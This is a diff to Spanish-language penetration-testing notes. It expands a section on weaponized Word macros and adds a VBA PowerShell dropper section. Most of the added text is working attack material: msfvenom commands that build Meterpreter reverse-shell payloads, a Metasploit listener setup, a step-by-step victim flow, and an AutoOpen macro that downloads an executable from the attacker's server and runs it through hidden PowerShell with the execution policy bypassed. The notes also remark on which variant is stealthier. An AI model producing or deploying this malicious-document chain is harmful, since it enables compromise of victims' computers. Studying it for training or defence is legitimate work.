@@ -550,23 +550,94 @@ MsgBox version    ' muestra versión de Windows
 #### Weaponizing VBA Macros with MSF
 
 ```bash
-msfvenom --list formats
-msfvenom -a x86 --plafform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.2.134 LPORT=4444 -f vba-exe
-# copiamos el codigo y lo enviamos al editor de macros en word
-# el hex al word
+# Generar payload VBA con msfvenom
+msfvenom --list formats                         # ver todos los formatos disponibles
+
+# Formato vba-exe — genera dos partes:
+# 1. Código VBA → va al editor de macros en Word (Alt+F11)
+# 2. Datos HEX → van pegados directamente en el cuerpo del documento Word
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
+    LHOST=<ip_kali> LPORT=4444 -f vba-exe
+
+# Formato vba-psh — genera solo código VBA (PowerShell dropper)
+# Todo va al editor de macros, no requiere pegar nada en el documento
+# Más limpio y más usado en la práctica
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
+    LHOST=<ip_kali> LPORT=4444 -f vba-psh
+
+# Diferencia clave:
+# vba-exe → payload embebido en hex dentro del doc (más pesado, más detectable)
+# vba-psh → payload descargado via PowerShell en memoria (más sigiloso)
+
+# Configurar listener en Metasploit
 msfconsole -q
-msf6 > use exploit/multi/handler
-msf6 exploit(multi/handler) > set payload woinwdows/meterpreter/reverse_tcp
-msf6 exploit(multi/handler) > set LHOST 192.168.2.134
-msf6 exploit(multi/handler) > set LPORT 4444
-msf6 exploit(multi/handler) > run
-# abrimos el documento y tenemos la sesion en el kali
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <ip_kali>
+set LPORT 4444
+run
 
-msfvenom -a x86 --plafform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.2.134 LPORT=4444 -f vba-psh # funciona igual pero la carga va directo al editor de macros, ya no al documento
-
-
+# Flujo completo
+# 1. Generar payload con msfvenom -f vba-psh
+# 2. Copiar código VBA al editor de macros del documento Word
+# 3. Guardar como .docm (Word con macros)
+# 4. Levantar listener en MSF
+# 5. Víctima abre el doc y habilita macros → sesión Meterpreter en Kali
 ```
+#### VBA Powershell Dropper
 
+```bash
+# Qué es un Dropper
+# Payload que NO genera acceso inicial por sí solo
+# Su función es descargar y ejecutar el payload real desde un servidor controlado
+# Ventaja: el documento malicioso es pequeño y menos detectable
+# El payload real (shell.exe) solo toca la máquina víctima en memoria o disco
+
+# Flujo completo
+# 1. Generar payload .exe con msfvenom
+# 2. Servirlo via HTTP desde Kali
+# 3. El dropper VBA en el doc descarga y ejecuta el .exe en la víctima
+# 4. El .exe se conecta al listener en Kali → sesión Meterpreter
+
+# Paso 1 — Generar payload
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
+    LHOST=<ip_kali> LPORT=4444 -f exe > shell.exe
+
+# Paso 2 — Servir el payload via HTTP
+sudo python3 -m http.server 8080
+
+# Paso 3 — Listener en Metasploit
+msfconsole -q
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <ip_kali>
+set LPORT 4444
+run
+
+# Paso 4 — Macro VBA en el documento Word
+Sub AutoOpen()
+    dropper
+End Sub
+
+Sub Document_Open()
+    dropper
+End Sub
+
+Sub dropper()
+    Dim url As String        ' URL donde está el payload
+    Dim psScript As String   ' comando PS que descarga y ejecuta el payload
+
+    url = "http://<ip_kali>:8080/shell.exe"
+
+    psScript = "Invoke-WebRequest -Uri """ & url & """ -OutFile ""C:\Users\Admin\file.exe"";" & vbCrLf & _
+               "Start-Process -FilePath ""C:\Users\Admin\file.exe"""
+
+    ' ExecutionPolicy Bypass — bypass de restricciones PS
+    ' WindowStyle Hidden — oculta la ventana de PS
+    ' vbHide — oculta también la ventana de cmd
+    Shell "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & psScript & """", vbHide
+End Sub
+```
 
 ## 03 - Web Application Penetration Testing
 ## 04 - Network Penetration Testing
